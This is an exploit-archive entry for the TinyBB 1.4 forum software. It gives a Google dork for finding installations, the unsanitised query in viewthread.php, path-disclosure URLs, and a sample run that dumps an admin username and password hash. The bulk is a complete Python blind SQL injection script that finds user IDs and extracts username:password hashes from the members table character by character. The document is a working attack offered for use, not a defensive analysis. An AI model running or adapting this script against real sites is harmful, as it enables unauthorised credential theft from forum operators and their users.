# Google Dork  : "Proudly powered by TinyBB"
# Date              : 7 April 2011
# Author           : swami
# Contact         : flavio[dot]baldassi[at]gmail[dot]com
# Version          : 1.4
# Tested on       : Centos 5.5 with magic_quotes_gpc off
# Thanks to      : ptrace.net
#
#  From tinybb.net
#  -------------------------
#  "TinyBB is a free, simple bulletin board script. TinyBB&#039;s community
is slowly growing and the number
#   of installs is slowly rising. TinyBB&#039;s software is 100% free and so
are our official add-ons."
#
#  Sql Injection [Fixed]
#  -----------------------
#  The  vulnerability exist in /inc/viewthread.php file at line 3. As
you can see below the $_GET[&#039;post&#039;] parameter isn&#039;t
#  properly sanitized.
#
#   $check_thread = mysql_query("SELECT * FROM `tinybb_threads` WHERE
#   `thread_key` = &#039;$_GET[post]&#039;") or die(mysql_error());  
#
#  Path Disclosure [Not fixed]
#  --------------------
#   A remote user can access these files to cause the system to display
an error message that indicates the installation  #   path.
#       1-  http://host/inc/login.php
#       2-  http://host/inc/categories.php
#
#swami@swami-desktop:~/Documents/py$ ./tinybb.py
#
# [+] TinyBB thread url:
http://192.168.2.6/tinybb/index.php?page=thread&post=444709648
# [?] Set up a Proxy ? [y/n] y
# [+] Proxy ip:port: 127.0.0.1:3128
# [+] Proxy is found to be working
# [+] Testing url:
http://192.168.2.6/tinybb/index.php?page=thread&post=444709648
# [+] Url vulnerable: YES
# [+] Users into the db: 1
# [+] Executing blind sql injection, this will take time ...
#
# [+] UserId 76: admin:64d7103eef2b14bbb2d0b57c38cc3fbee29ff72a
#
# [+] Done
#
 
#!/usr/bin/python
#
import sys
import urllib.request
 
def banner():
     
   print(&#039;+                  +&#039;)
   print(&#039;|   ------------------------------   |&#039;)
   print(&#039;|   TinyBB 1.4 Blind Sql INjector    |&#039;)
   print(&#039;|   ------------------------------   |&#039;)
   print(&#039;+ by swami                 +\n&#039;)
 
def setProxy(ip):
     
   try:
    proxy = urllib.request.ProxyHandler( {&#039;http&#039;:&#039;http://&#039;+ str(ip) } )
    opener = urllib.request.build_opener( proxy )
    opener.open(&#039;http://www.google.com&#039;)
    print(&#039;[+] Proxy is found to be working&#039;)
 
   except:
    print(&#039;[-] Proxy doesn\&#039;t work&#039;)
    print(&#039;[-] Exit ...&#039;)
    sys.exit(1)
 
   return opener
 
def testUrl(url, handle):
 
   print(&#039;[+] Testing url: &#039;+ url)
 
   try:
    req = handle.open( url )
    req = req.read().decode(&#039;utf-8&#039;)
 
   except:
    print(&#039;[-] &#039;+ url +&#039; is not a valid url&#039;)
    print(&#039;[-] Exit ...&#039;)
    sys.exit(1)
 
   return req
 
def urlVulnerable(url, clean, handle):
 
   sys.stdout.write(&#039;[+] Url vulnerable: &#039;)
 
   try:
    req = handle.open( url + "&#039;" )
    req = req.read().decode(&#039;utf-8&#039;)
 
   except:
        sys.exit(&#039;\n[-] Url typing error&#039;)
 
 
   if len(clean) > len(req):
    sys.stdout.write(&#039;YES\n&#039;)
    sys.stdout.flush()
 
   else:
    sys.stdout.write(&#039;NO\n[-] Exit...\n&#039;)
    sys.stdout.flush()
    sys.exit(1)
     
def getTrueValue(url, handle):
 
   trueValue = handle.open( url + "&#039;%20and%20&#039;1&#039;=&#039;1" )
   return len( trueValue.read().decode(&#039;utf-8&#039;) )
 
 
def getNUsers(url, trueValue, handle):
 
   users = list()
 
   sys.stdout.write(&#039;[+] Users into the db: &#039;)
   sys.stdout.flush()
 
   for userid in range(1,100):
 
    inject = url + "&#039;%20and%20(SELECT%201%20FROM%20members%20WHERE%20id="+ str(userid) +")=&#039;1"
 
    try:
        req = handle.open( inject )
        req = req.read().decode(&#039;utf-8&#039;)
 
    except:
        print(&#039;[-] Somenthing went wrong&#039;)
        sys.exit(1)
 
    if len(req) == trueValue:
        users.append(userid)
 
   sys.stdout.write( str(len(users)) )
 
   return users
 
 
def doBlind(url, handle, nUserId, trueValue):
 
    print(&#039;\n[+] Executing blind sql injection, this will take time ...\n&#039;)
 
    for x in range(len(nUserId)):
 
        position = 1 # Line position
        userid = nUserId[x]
        char = 33 # Start from !
 
        sys.stdout.write(&#039;[+] UserId &#039;+ str(userid) +&#039;: &#039;)
        sys.stdout.flush()
 
        # Execute Blind Sql INjection
        while True:
 
            inject = url
            inject += "&#039;%20and%20ascii(substring((SELECT%20concat(username,0x3a,password)%20FROM%20"
            inject += "members%20WHERE%20id="+ str(userid) +"),"+ str(position) +",1))>"+ str(char) +"%20--&#039;"
 
            result = handle.open( inject )
            result = result.read().decode(&#039;utf-8&#039;)
 
            # If we don&#039;t get errors
            if len(result) == trueValue:
                char += 1
 
            else:
 
                if position > 43 and chr(char) == "!":
                    break
 
                else:
                    sys.stdout.write( chr(char) )
                    sys.stdout.flush()
                    position += 1
                    char = 33 #Reset char
 
            if char == 127 :
                print(&#039;[-] Ascii table is over. Exit... :/&#039;)
                sys.exit(1)
 
        print()
 
 
if __name__ == "__main__":
 
    banner()
    url = input(&#039;[+] TinyBB thread url: &#039;)
 
    if input(&#039;[?] Set up a Proxy ? [y/n] &#039;) == &#039;y&#039; :
        handle = setProxy( input(&#039;[+] Proxy ip:port: &#039;) )
 
    else:
        handle = urllib.request.build_opener()
 
    clean = testUrl(url, handle)
    urlVulnerable(url, clean, handle)
    trueValue = getTrueValue(url, handle)
    userId = getNUsers(url, trueValue, handle)
    doBlind(url, handle, userId, trueValue)
 
    print(&#039;\n[+] Done &#039;)



